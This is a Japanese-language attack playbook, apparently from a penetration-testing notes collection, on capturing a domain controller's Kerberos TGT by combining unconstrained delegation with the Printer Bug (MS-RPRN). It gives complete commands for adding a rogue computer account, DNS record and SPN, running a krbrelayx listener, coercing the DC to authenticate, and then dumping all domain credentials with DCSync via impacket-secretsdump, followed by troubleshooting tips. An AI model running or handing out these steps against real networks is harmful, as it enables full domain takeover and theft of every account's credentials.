# Unconstrained Delegation + Printer Bug による TGT キャプチャ

## 概要

Unconstrained Delegation が設定されたコンピューターに対して認証してきたユーザーの TGT（チケット認証証明書）がメモリに保存される仕組みを利用する攻撃。Printer Bug（MS-RPRN）で DC を強制的に認証させることで、DC の TGT を取得し DCSync を実行する。

---

## 着火条件

以下の**すべて**が満たされている場合：

1. `SeEnableDelegationPrivilege` を持つユーザーの権限がある（Unconstrained Delegation を設定できる）
2. DC 上で Printer Spooler サービスが稼働している
3. DNS の書き込み権限がある（または既存アカウントに SPN を付与できる）

---

## 攻撃の原理

1. 攻撃側が Unconstrained Delegation を持つコンピューターアカウントを作成
2. そのコンピューターの DNS レコードと SPN を登録（DCが Kerberos 認証できるようにする）
3. krbrelayx でリスナーを起動（Kerberos TGT をキャプチャする）
4. Printer Bug (MS-RPRN) で DC に「自分の CIFS サービスに認証しろ」と強制
5. DC が Kerberos 認証を試みて TGT を送信 → キャプチャ
6. DC の TGT で DCSync

---

## 手順

### Step 1: 攻撃用コンピューターアカウントを作成

```bash
impacket-addcomputer \
  -computer-name 'ATTACKER$' \
  -computer-pass 'P@ssw0rd1234!' \
  -dc-ip [DC_IP] -domain [DOMAIN] -method SAMR \
  '[DOMAIN]/[USER]:[PASSWORD]'
```

### Step 2: Unconstrained Delegation を設定

`SeEnableDelegationPrivilege` を持つユーザーの権限で設定：
```bash
# ATTACKER$ に Unconstrained Delegation を設定
# BloodHound で SeEnableDelegationPrivilege を確認したユーザーのシェルから
Set-ADComputer ATTACKER$ -TrustedForDelegation $True
```

または impacket を使って属性を直接変更する。

### Step 3: DNS レコードの追加

攻撃側マシンの IP を指す DNS レコードを登録する：
```bash
python3 /path/to/krbrelayx/dnstool.py \
  -u '[DOMAIN]\ATTACKER$' -p 'P@ssw0rd1234!' \
  -r attacker.[DOMAIN] \
  -d [ATTACKER_IP] \
  --action add [DC_IP]
```

### Step 4: ATTACKER$ に SPN を追加

DC が Kerberos 認証できるように SPN を登録する：
```bash
python3 /path/to/krbrelayx/addspn.py \
  -u '[DOMAIN]\[USER]' -p '[PASSWORD]' \
  -s 'HOST/attacker.[DOMAIN]' \
  -t 'ATTACKER$' \
  [DC_IP]
```

### Step 5: krbrelayx でリスナーを起動

**重要:** バックグラウンド実行時に stdin が EOF になって即終了するため、`tail -f /dev/null` でパイプする。

```bash
# ATTACKER$ パスワードの NT ハッシュを計算
python3 -c "import hashlib; print(hashlib.new('md4', 'P@ssw0rd1234!'.encode('utf-16-le')).hexdigest())"
# → NT ハッシュを取得

# リスナーを起動
tail -f /dev/null | python3 /path/to/krbrelayx/krbrelayx.py \
  -hashes :[NT_HASH] \
  -ip [ATTACKER_IP] \
  -l /tmp/loot \
  -f ccache \
  -dc-ip [DC_IP] &
```

### Step 6: Printer Bug で DC を強制認証

```bash
python3 /path/to/krbrelayx/printerbug.py \
  '[DOMAIN]/[USER]@[DC_FQDN]' \
  attacker.[DOMAIN]
```

成功すると `/tmp/loot/` に `DC$@[DOMAIN]_krbtgt@[DOMAIN].ccache` が保存される。

### Step 7: DC の TGT で DCSync

```bash
export KRB5CCNAME="/tmp/loot/DC1\$@[DOMAIN]_krbtgt@[DOMAIN].ccache"

impacket-secretsdump \
  -k -no-pass \
  -dc-ip [DC_IP] \
  'DC1$@[DC_FQDN]'
```

---

## トラブルシューティング

| 症状 | 原因・対処 |
|------|-----------|
| krbrelayx がすぐに終了する | `tail -f /dev/null \|` を先頭に追加してパイプする |
| DC が NTLM で接続してくる | ATTACKER$ に SPN が設定されていない → Step 4 を確認 |
| `printerbug` でログエラーが出る | impacket のバージョン互換性の問題。動作自体は正常なことが多い |
| `KRB_AP_ERR_SKEW` | 時刻のずれ → `sudo ntpdate [DC_IP]` |

---

## 関連技術
- RBCD（よりシンプルな委任攻撃） → `RBCD.md`
- DCSync実行後 → `../Credential_Dumping.md`
